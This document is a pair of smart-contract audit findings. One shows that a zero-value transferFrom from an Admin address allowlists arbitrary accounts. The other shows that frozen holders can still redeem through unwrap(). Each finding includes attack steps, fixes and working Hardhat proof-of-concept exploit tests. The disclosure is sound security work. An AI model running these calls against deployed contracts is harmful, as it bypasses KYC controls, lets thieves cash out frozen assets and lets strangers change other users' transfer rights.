# [High] Anyone can bypass Admin authorization and allowlist arbitrary addresses via zero-value transferFrom

## Summary

With transfer restrictions enabled, `address(0)` is `ADMIN`. A transfer from an Admin to a non-allowlisted recipient automatically marks the recipient `ALLOWED`. `transferFrom(sender, recipient, 0)` needs no approval, because the allowance check computes `0 - 0`. Therefore anyone can call `transferFrom(address(0), target, 0)` and flip any address from `FREE` to `ALLOWED`, including their own, without owner action, KYC, or holding any tokens. The same works with any other Admin address as `sender`, even when `setApplicable(false)`.

```solidity
// ERC20Flaggable.sol:166-175
function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    _transfer(sender, recipient, amount);                       // hook runs with from = sender
    uint256 currentAllowance = allowance(sender, msg.sender);
    if (currentAllowance < INFINITE_ALLOWANCE){
        _allowances[sender][msg.sender] = currentAllowance - amount;   // 0 - 0 = 0, no approval needed
    }
    return true;
}

// ERC20Flaggable.sol:191-196
function _transfer(address sender, address recipient, uint256 amount) internal virtual {
    _beforeTokenTransfer(sender, recipient, amount);
    decreaseBalance(sender, amount);                            // 0 - 0, passes
    increaseBalance(recipient, amount);                         // +0, passes
    emit Transfer(sender, recipient, amount);
}

// ERC20Allowlistable.sol:_beforeTokenTransfer:175-193 (excerpt)
} else if (!isAdmin(to) && !isAllowed(to)) {
    if (isAllowed(from)) revert Allowlist_ReceiverNotAllowlisted(to);
    // Admin address always sets the recipient to ALLOWED
    if (isAdmin(from)) {
        setFlag(to, FLAG_INDEX_ALLOWED, true);
        emit AddressTypeUpdate(to, TYPE_ALLOWED);
    }
}
```

The hook treats "from is Admin" as proof that an Admin initiated the transfer, but `transferFrom` lets any caller choose `sender`, and a zero amount skips every check that would normally stop them.

```text
1. The owner calls setApplicable(true), so address(0) is ADMIN. Alice is minted tokens and is ALLOWED.
2. Mallory is not KYC'd, is FREE, and holds 0 tokens. Alice cannot send to her (transfer reverts).
3. Mallory calls transferFrom(address(0), Mallory, 0) with no approval.
4. _beforeTokenTransfer sees from = ADMIN, to = FREE and calls setFlag(Mallory, ALLOWED, true).
5. decreaseBalance(0, 0), increaseBalance(Mallory, 0) and the allowance update (0 - 0) all pass.
6. Mallory is now ALLOWED. Alice calls transfer(Mallory, 100) and it succeeds.
```

The same call with `target` set to another user flips that user's type without their involvement, which also works as a griefing attack (see Impact).

## Why this is a bug

`doc/allowlist.md:12` says Admin addresses implicitly turn *target addresses* into Allowed addresses. That is a power of the Admin's own transfers, and `doc/allowlist.md:35-36` shows that `0x0` is made Admin so that minting allowlists recipients. Nothing in the docs says an unrelated caller can trigger that power with a zero-value `transferFrom` on behalf of an Admin. The allowlist exists to control who can hold restricted tokens, and this lets any address, or any third party acting for it, bypass that control without the owner.

## Impact

| Scenario | Before | After | Observed result |
|---|---|---|---|
| Mallory self-allowlists via `transferFrom(address(0), Mallory, 0)` | FREE, 0 tokens | ALLOWED, then 100 tokens after Alice sends | **Non-KYC party becomes allowed and receives restricted shares** |
| Mallory allowlists a third party | FREE | ALLOWED | **Allowlist state changed without authority** |
| Same with a non-zero Admin as `sender`, `setApplicable(false)` | FREE | ALLOWED | **Works with any Admin, restrictions off or on** |
| Mallory griefs Bob (FREE, holds 50 from before restrictions) | Bob can send to any address | Bob's `transfer` to a FREE address reverts with `Allowlist_ReceiverNotAllowlisted` | **Bob's transfer rights changed by a stranger** |

- The KYC / allowlist gate on receiving restricted shares can be bypassed by anyone, with no owner action.
- A third party can unilaterally and permanently change another user's transfer rights. Only the owner can undo it (via `setType`).
- Zero-value `Transfer(admin, victim, 0)` events can be spoofed, which enables address poisoning.

## Mitigation

Do not let a zero-amount transfer trigger the Admin auto-allowlisting, and do not let `transferFrom` act for an Admin without authority. A minimal change in the hook:

```solidity
// ERC20Allowlistable._beforeTokenTransfer
function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual override {
    ...
    // Admin address always sets the recipient to ALLOWED, but only for real transfers
    if (isAdmin(from) && amount > 0) {
        setFlag(to, FLAG_INDEX_ALLOWED, true);
        emit AddressTypeUpdate(to, TYPE_ALLOWED);
    }
}
```

A non-zero `transferFrom` from `address(0)` already reverts on the balance check, and a non-zero `transferFrom` from another Admin needs an allowance that the Admin granted deliberately. For defence in depth, also revert in `transferFrom` when `sender == address(0)`.

Before changing the hook, check whether any flow relies on a zero-amount mint to allowlist an address. If so, allowlist through `setType` instead.

## PoC

Add `test/ZeroValueTransferFromAllowlistPoC.ts` and run:

```bash
npx hardhat test test/ZeroValueTransferFromAllowlistPoC.ts
```

Observed on the current code: 5 passing. Self-allowlisting, third-party allowlisting, the non-zero Admin case, and the Bob griefing case all succeed.

```ts
import { expect } from "chai";
import { Contract } from "ethers";
import { ethers, owner, signer1, signer2, signer3, signer4, signer5 } from "./TestBase.ts";

const TYPE_ADMIN = 4n;

async function deployShares(): Promise<Contract> {
  const Shares = await ethers.getContractFactory("contracts/shares/base/Shares.sol:Shares");
  const s = await Shares.deploy("TEST", "Test Company Shares", "https://test.com/terms", owner);
  await s.waitForDeployment();
  return s as unknown as Contract;
}

describe("PoC: zero-value transferFrom allowlists arbitrary addresses", function () {
  const alice = signer1;      // KYC'd holder (ALLOWED)
  const mallory = signer2;    // not KYC'd, FREE, holds nothing
  let shares: Contract;

  describe("address(0) is ADMIN (setApplicable(true))", function () {
    beforeEach(async function () {
      shares = await deployShares();
      await shares.connect(owner).setApplicable(true);
      await shares.connect(owner).mint(alice.address, 100n);

      expect(await shares.isAllowed(alice.address)).to.equal(true);
      expect(await shares.isAllowed(mallory.address)).to.equal(false);
    });

    it("sanity: an ALLOWED holder cannot send to a non-allowlisted address", async function () {
      await expect(shares.connect(alice).transfer(mallory.address, 1n)).to.revert(ethers);
    });

    it("POC: Mallory allowlists herself with transferFrom(address(0), Mallory, 0) and receives restricted shares", async function () {
      // No approval, no tokens, no owner action.
      await shares.connect(mallory).transferFrom(ethers.ZeroAddress, mallory.address, 0n);

      expect(await shares.isAllowed(mallory.address)).to.equal(true);

      // Alice (ALLOWED) can now send to Mallory, who was never KYC'd.
      await shares.connect(alice).transfer(mallory.address, 100n);
      expect(await shares.balanceOf(mallory.address)).to.equal(100n);
      expect(await shares.balanceOf(alice.address)).to.equal(0n);
    });

    it("POC: Mallory allowlists a third party without any authority over it", async function () {
      const victim = signer3;
      expect(await shares.isAllowed(victim.address)).to.equal(false);

      await shares.connect(mallory).transferFrom(ethers.ZeroAddress, victim.address, 0n);

      expect(await shares.isAllowed(victim.address)).to.equal(true);
    });
  });

  describe("a non-zero ADMIN address as sender, restrictions off", function () {
    it("POC: works with any ADMIN sender, even when setApplicable(false)", async function () {
      shares = await deployShares();
      const admin = signer4;
      await shares.connect(owner)["setType(address,uint8)"](admin.address, TYPE_ADMIN);
      expect(await shares.isAllowed(mallory.address)).to.equal(false);

      await shares.connect(mallory).transferFrom(admin.address, mallory.address, 0n);

      expect(await shares.isAllowed(mallory.address)).to.equal(true);
    });
  });

  describe("third-party griefing of a FREE holder", function () {
    it("POC: Mallory pins Bob out of sending to FREE addresses", async function () {
      const bob = signer3;      // FREE, holds tokens from before restrictions were switched on
      const pool = signer5;     // FREE counterparty (e.g. a DEX pool)
      shares = await deployShares();
      await shares.connect(owner).mint(bob.address, 50n);      // restrictions still off: Bob is FREE
      await shares.connect(owner).setApplicable(true);
      expect(await shares.isAllowed(bob.address)).to.equal(false);

      await shares.connect(mallory).transferFrom(ethers.ZeroAddress, bob.address, 0n);

      // Bob was flipped FREE -> ALLOWED and can now only send to ALLOWED/ADMIN addresses.
      expect(await shares.isAllowed(bob.address)).to.equal(true);
      await expect(shares.connect(bob).transfer(pool.address, 50n))
        .to.be.revertedWithCustomError(shares, "Allowlist_ReceiverNotAllowlisted")
        .withArgs(pool.address);
    });
  });
});
```


# ---------------------------------------------------------------------------

# [High] Frozen holders can still redeem via `unwrap()` because the burn path allows Restricted → `address(0)` (Admin)

## Summary

When a holder redeems wrapped shares with `unwrap()`, the contract burns the wrapper tokens, and the allowlist treats that burn as a transfer to `address(0)`. With transfer restrictions on, `address(0)` is Admin, and a frozen (Restricted) holder is allowed to send to Admin. The burn therefore passes, and `unwrap()` then pays the underlying asset to the frozen holder. The freeze does not stop any frozen account from cashing out.

```solidity
// SharesUnderAgreement.sol:139-143
function unwrap(uint256 amount) requireNonBinding external {
    uint256 baseAmount = convertToBase(amount);
    _burn(msg.sender, amount);                       // checked as: holder -> address(0)
    base.safeTransfer(msg.sender, baseAmount);       // underlying asset goes to the caller
}

// ERC20Allowlistable.sol:72-78
function setApplicable(bool transferRestrictionsApplicable) external onlyOwner {
    if (transferRestrictionsApplicable) {
        setTypeInternal(address(0x0), TYPE_ADMIN);
        } else {
            setTypeInternal(address(0x0), TYPE_FREE);
        }
    }
}

// ERC20Allowlistable.sol:175-193 (excerpt)
} else if (isRestricted(from)) {
    if (!isAdmin(to)) revert Allowlist_SenderIsForbidden(from);   // Restricted -> Admin is allowed
}
```

With restrictions enabled, `address(0)` is `ADMIN`. A frozen holder is `RESTRICTED`, so `unwrap()` is checked as `RESTRICTED -> ADMIN`, which the allowlist permits. `address(0)` is only involved in classifying the burn. The asset released by `unwrap()` goes directly to the frozen holder, not to `address(0)` or an Admin.

```text
1. Transfer restrictions are enabled with setApplicable(true).
2. A holder receives wrapped tokens and is Allowed.
3. The issuer freezes the holder with freeze(), changing the holder to Restricted.
4. A termination, migration, or executed acquisition makes binding == false.
5. The frozen holder calls unwrap().
6. _burn(holder, amount) is checked as Restricted -> Admin(0x0) and is allowed.
7. unwrap() calls base.safeTransfer(holder, baseAmount).
8. The frozen holder receives the underlying base asset.
```

## Why this is a bug

For a plain token, allowing a Restricted holder to "send" tokens to `address(0)` is harmless, since it only burns their own balance. In `SharesUnderAgreement`, however, `unwrap()` burns the wrapper tokens and then transfers the underlying base asset to the caller. The allowlist hook cannot distinguish this burn from a Restricted → Admin transfer, so the burn path becomes a redemption path for frozen holders.

The docs state that unwrapping is available once the agreement is no longer binding, and that holders then receive their share of the underlying asset or the sale proceeds (`doc/draggable.md:15`, `doc/dragalong.md:36`).

**Documented behaviour.** `doc/cmta-compatibility-2.md:288` notes that when the allowlist is applicable `0x0` is `ADMIN`, so a `RESTRICTED` sender is permitted to burn, i.e. the owner can burn from a frozen address. That describes owner-initiated burns. Here the burn is initiated by the frozen holder, and it releases the base asset to that holder.

The docs describe the freeze as a full block, not a partial one:

- `doc/allowlist.md:40`: "Restricted" should be used for "entirely blocked tokens, such as in cases of theft or loss."
- `doc/cmta-compatibility-2.md:268`: "In the standard burn function, tokens from a frozen wallet MUST NOT be burnable."

Nothing in the docs says a frozen holder may redeem value. In `SharesUnderAgreement`, `unwrap()` is that holder-initiated burn, so a frozen balance stops being blocked once the wrapper becomes non-binding. This contradicts the documented purpose of the freeze.

## Impact

| Scenario | Before | After | Observed result |
|---|---|---|---|
| Frozen holder calls `unwrap(100)` after termination | 100 wrapper / 0 base | 0 wrapper / 100 base | **Freeze did not block redemption** |
| Direct transfer of wrapper tokens from the frozen holder | n/a | reverts | The block is enforced everywhere except the burn |

- A thief holding frozen wrapper tokens can still collect the underlying asset or the sale proceeds.
- The impact is greatest in an acquisition, where the base is the payment currency, which the issuer cannot freeze.

## Mitigation

Block the redemption path, not all burns, so documented owner burns and recovery keep working (`Recoverable.sol:122`, `Shares.sol:142`, `Shares.sol:211`). `unwrap()` is the only holder-initiated burn in the wrapper (`_burn` is called only at `SharesUnderAgreement.sol:141`):

```solidity
// SharesUnderAgreement.sol
function unwrap(uint256 amount) requireNonBinding external {
    if (isRestricted(msg.sender)) revert Allowlist_SenderIsForbidden(msg.sender);
    uint256 baseAmount = convertToBase(amount);
    _burn(msg.sender, amount);
    base.safeTransfer(msg.sender, baseAmount);
}
```

If the issuer needs a frozen holder to be able to redeem in some cases, the owner should do it through an explicit, owner-controlled path (for example a recovery or forced redemption) and not through the holder's own `unwrap()`.

## PoC

Add `test/UnwrapBurnAllowlistPoC.ts` and run:

```bash
npx hardhat test test/UnwrapBurnAllowlistPoC.ts
```

The PoC shows a frozen holder redeeming through `unwrap()` after termination, while a direct transfer from the same holder reverts.

```ts
import { expect } from "chai";
import { Contract } from "ethers";
import { connection, ethers, owner, signer1, signer2 } from "./TestBase.ts";

const MIGRATION_DELAY = 20n * 24n * 60n * 60n; // 20 days
const HOLDINGS = 100n;

async function deployShares(): Promise<Contract> {
  const Shares = await ethers.getContractFactory("contracts/shares/base/Shares.sol:Shares");
  const s = await Shares.deploy("TEST", "Test Company Shares", "https://test.com/terms", owner);
  await s.waitForDeployment();
  return s as unknown as Contract;
}

async function deployWrapper(base: Contract): Promise<Contract> {
  const SUA = await ethers.getContractFactory("contracts/shares/sha/SharesUnderAgreement.sol:SharesUnderAgreement");
  const sua = await SUA.deploy(base, "https://test.com/agreement", 0, owner);
  await sua.waitForDeployment();
  return sua as unknown as Contract;
}

describe("PoC: frozen holder can unwrap (redeem) via the burn path", function () {
  const holder = signer1;
  let base: Contract;
  let wrapper: Contract;

  async function terminateAgreement() {
    await wrapper.connect(owner).proposeTermination();
    await connection.networkHelpers.time.increase(MIGRATION_DELAY + 1n);
    await wrapper.connect(owner).executeMigration();
    expect(await wrapper.binding()).to.equal(false);
  }

  beforeEach(async function () {
    base = await deployShares();
    wrapper = await deployWrapper(base);

    // Transfer restrictions active: address(0) becomes ADMIN, first recipient of minted tokens is ALLOWED.
    await wrapper.connect(owner).setApplicable(true);

    await base.connect(owner).mint(holder.address, HOLDINGS);
    await base.connect(holder).approve(wrapper, HOLDINGS);
    await wrapper.connect(holder)["wrap(uint256)"](HOLDINGS);
    expect(await wrapper.isAllowed(holder.address)).to.equal(true);
  });

  it("control: an ALLOWED holder can unwrap after termination", async function () {
    await terminateAgreement();

    await wrapper.connect(holder).unwrap(HOLDINGS);

    expect(await wrapper.balanceOf(holder.address)).to.equal(0n);
    expect(await base.balanceOf(holder.address)).to.equal(HOLDINGS);
  });

  describe("frozen wrapper holder", function () {
    beforeEach(async function () {
      await wrapper.connect(owner).freeze(holder.address);
      expect(await wrapper.isRestricted(holder.address)).to.equal(true);
    });

    it("sanity: frozen holder cannot transfer wrapper tokens to a normal address", async function () {
      await expect(wrapper.connect(holder).transfer(signer2.address, 1n)).to.revert(ethers);
    });

    it("POC: frozen holder can unwrap (redeem) after termination", async function () {
      await terminateAgreement();

      await wrapper.connect(holder).unwrap(HOLDINGS);

      // The wrapper-level freeze did not stop redemption.
      expect(await wrapper.balanceOf(holder.address)).to.equal(0n);
      expect(await base.balanceOf(holder.address)).to.equal(HOLDINGS);
    });
  });
});
```
